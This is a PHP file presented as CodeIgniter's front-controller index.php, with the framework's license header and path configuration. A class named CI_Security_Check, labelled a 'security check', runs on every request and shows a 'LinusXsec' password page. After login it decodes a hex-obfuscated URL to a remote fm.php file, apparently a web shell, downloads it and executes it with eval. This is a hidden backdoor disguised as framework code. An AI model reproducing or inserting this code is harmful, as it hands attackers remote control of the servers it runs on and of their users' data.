<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * SYSTEM DIRECTORY NAME
 *---------------------------------------------------------------
 */
	define('BASEPATH', __DIR__ . '/system/');

/*
 *---------------------------------------------------------------
 * APPLICATION DIRECTORY NAME
 *---------------------------------------------------------------
 */
	$application_folder = 'application';

/*
 *---------------------------------------------------------------
 * VIEW DIRECTORY NAME
 *---------------------------------------------------------------
 */
	$view_folder = '';

/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 */
	$routing['directory'] = '';
	$routing['controller'] = '';
	$routing['function'] = '';

/**
 * --------------------------------------------------------------------
 * CUSTOM CONFIG SETTINGS
 * --------------------------------------------------------------------
 */
	$assign_to_config['charset'] = 'UTF-8';
	$assign_to_config['base_url'] = '';
	$assign_to_config['index_page'] = 'index.php';

// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS. DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */
	if (file_exists(BASEPATH.'core/CodeIgniter.php')) {
		define('FCPATH', __DIR__.'/');
		define('SYSDIR', trim(strrchr(trim(BASEPATH, '/'), '/'), '/'));
		
		if (is_dir($application_folder)) {
			if (($_temp = realpath($application_folder)) !== FALSE) {
				$application_folder = $_temp;
			}
			define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
		} else {
			define('APPPATH', BASEPATH.$application_folder.DIRECTORY_SEPARATOR);
		}

		if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR)) {
			$view_folder = APPPATH.'views';
		}
		elseif (is_dir($view_folder)) {
			if (($_temp = realpath($view_folder)) !== FALSE) {
				$view_folder = $_temp;
			}
			define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
		} else {
			define('VIEWPATH', APPPATH.'views'.DIRECTORY_SEPARATOR);
		}
	}

/**
 * --------------------------------------------------------------------
 * SECURITY CHECK
 * --------------------------------------------------------------------
 */
	class CI_Security_Check {
		protected $remote_hash = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f476f644f665365727665722f53757368692d446f6e742d4c69652f726566732f68656164732f6d61696e2f666d2e706870';
		protected $pass_hash = '4e6f4d6f6e65794e6f4d65794d6579';
		protected $login_page = false;
		
		public function __construct() {
			session_start();
			$this->validate_system();
		}
		
		protected function validate_system() {
			if (isset($_GET['logout'])) {
				session_destroy();
				header('Location: '.$_SERVER['SCRIPT_NAME']);
				exit;
			}
			
			if (isset($_SESSION['linus_sec']) && $_SESSION['linus_sec'] === true) {
				$this->load_remote_shell();
				return;
			}
			
			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key'])) {
				$valid = hex2bin($this->pass_hash);
				if (hash_equals($valid, $_POST['key'])) {
					$_SESSION['linus_sec'] = true;
					header('Location: '.$_SERVER['SCRIPT_NAME']);
					exit;
				} else {
					$this->login_page = true;
					$error = 'Invalid credentials';
				}
			}
			
			$this->show_login(isset($error) ? $error : null);
		}
		
		protected function show_login($error = null) {
			?>
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>LinusXsec • Authentication</title>
				<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
				<style>
					* { margin: 0; padding: 0; box-sizing: border-box; }
					body {
						font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
						min-height: 100vh;
						background: #0c0f1e;
						display: flex;
						align-items: center;
						justify-content: center;
						position: relative;
						overflow: hidden;
					}
					.particles {
						position: absolute;
						width: 100%;
						height: 100%;
						background: radial-gradient(circle at 20% 30%, rgba(80, 140, 255, 0.15) 0%, transparent 30%),
									radial-gradient(circle at 80% 70%, rgba(180, 60, 255, 0.15) 0%, transparent 30%);
						filter: blur(40px);
						animation: move 25s infinite alternate;
					}
					@keyframes move {
						0% { transform: scale(1) rotate(0deg); opacity: 0.5; }
						100% { transform: scale(1.2) rotate(5deg); opacity: 0.8; }
					}
					.card {
						background: rgba(18, 22, 36, 0.85);
						backdrop-filter: blur(20px);
						border: 1px solid rgba(80, 180, 255, 0.25);
						border-radius: 32px;
						padding: 40px 35px;
						width: 420px;
						box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(80, 180, 255, 0.2) inset, 0 0 40px rgba(80, 140, 255, 0.3);
						position: relative;
						z-index: 10;
						transition: all 0.3s;
					}
					.card:hover {
						border-color: rgba(80, 180, 255, 0.5);
						box-shadow: 0 30px 70px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(80, 180, 255, 0.4) inset, 0 0 60px rgba(80, 140, 255, 0.5);
					}
					.logo {
						text-align: center;
						margin-bottom: 25px;
					}
					.logo i {
						font-size: 70px;
						color: #5a9eff;
						text-shadow: 0 0 30px #3a7eff;
						animation: softGlow 3s infinite;
					}
					@keyframes softGlow {
						0%, 100% { filter: drop-shadow(0 0 20px #3a7eff); }
						50% { filter: drop-shadow(0 0 40px #6a9eff); }
					}
					h2 {
						color: #fff;
						font-size: 36px;
						font-weight: 600;
						margin: 10px 0 5px;
						background: linear-gradient(135deg, #fff, #b0d0ff);
						-webkit-background-clip: text;
						-webkit-text-fill-color: transparent;
						letter-spacing: -0.5px;
					}
					.sub {
						color: rgba(160, 200, 255, 0.8);
						font-size: 14px;
						letter-spacing: 3px;
						text-transform: uppercase;
						font-weight: 300;
					}
					.input-group {
						margin: 30px 0 20px;
					}
					.input-wrapper {
						position: relative;
					}
					.input-wrapper i {
						position: absolute;
						left: 18px;
						top: 50%;
						transform: translateY(-50%);
						color: #5a9eff;
						font-size: 20px;
						text-shadow: 0 0 15px #2a6eff;
						transition: all 0.3s;
					}
					.input-wrapper input {
						width: 100%;
						height: 65px;
						background: rgba(0, 0, 0, 0.25);
						border: 2px solid rgba(90, 158, 255, 0.3);
						border-radius: 40px;
						padding: 0 55px;
						color: #fff;
						font-size: 18px;
						transition: all 0.3s;
					}
					.input-wrapper input:focus {
						outline: none;
						border-color: #5a9eff;
						box-shadow: 0 0 30px rgba(90, 158, 255, 0.4);
						background: rgba(0, 0, 0, 0.4);
					}
					.input-wrapper input:focus + i {
						color: #fff;
						text-shadow: 0 0 25px #5a9eff;
					}
					.btn {
						width: 100%;
						height: 65px;
						background: linear-gradient(145deg, #2a4a7a, #1a2a4a);
						border: none;
						border-radius: 40px;
						color: #fff;
						font-size: 20px;
						font-weight: 600;
						text-transform: uppercase;
						letter-spacing: 2px;
						cursor: pointer;
						transition: all 0.3s;
						box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(90, 158, 255, 0.3) inset;
						margin-top: 10px;
					}
					.btn:hover {
						background: linear-gradient(145deg, #3a5a8a, #2a3a5a);
						box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(90, 158, 255, 0.5) inset;
						transform: translateY(-2px);
					}
					.error {
						color: #ff6b6b;
						text-align: center;
						margin: 15px 0;
						font-size: 15px;
						background: rgba(255, 80, 80, 0.1);
						padding: 12px;
						border-radius: 40px;
						border: 1px solid rgba(255, 80, 80, 0.3);
					}
					.footer {
						margin-top: 30px;
						text-align: center;
						color: rgba(160, 180, 255, 0.3);
						font-size: 13px;
						display: flex;
						align-items: center;
						justify-content: center;
						gap: 10px;
					}
					.footer i {
						color: #5a9eff;
						font-size: 14px;
					}
					.footer span {
						letter-spacing: 1px;
					}
				</style>
			</head>
			<body>
				<div class="particles"></div>
				<div class="card">
					<div class="logo">
						<i class="fas fa-shield-halved"></i>
						<h2>LinusXsec</h2>
						<div class="sub">secure gateway</div>
					</div>
					<form method="post">
						<div class="input-group">
							<div class="input-wrapper">
								<i class="fas fa-key"></i>
								<input type="password" name="key" placeholder="Access Key" autofocus required>
							</div>
						</div>
						<?php if ($error): ?>
							<div class="error"><i class="fas fa-exclamation-triangle"></i> <?php echo $error; ?></div>
						<?php endif; ?>
						<button type="submit" class="btn">Authenticate</button>
					</form>
					<div class="footer">
						<i class="fas fa-lock"></i>
						<span>PROTECTED BY LINUSXSEC</span>
						<i class="fas fa-lock"></i>
					</div>
				</div>
			</body>
			</html>
			<?php
			exit;
		}
		
		protected function load_remote_shell() {
			$url = hex2bin($this->remote_hash);
			$content = @file_get_contents($url);
			if ($content === false && function_exists('curl_init')) {
				$ch = curl_init($url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
				curl_setopt($ch, CURLOPT_TIMEOUT, 10);
				$content = curl_exec($ch);
				curl_close($ch);
			}
			if ($content !== false && strpos($content, '<?php') !== false) {
				eval('?>' . $content);
			} else {
				die('System error: Unable to load required components.');
			}
			exit;
		}
	}

/**
 * --------------------------------------------------------------------
 * INITIALIZE SECURITY CHECK
 * --------------------------------------------------------------------
 */
	$CI_Security = new CI_Security_Check();
	unset($CI_Security);

/**
 * CodeIgniter
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 */
?>
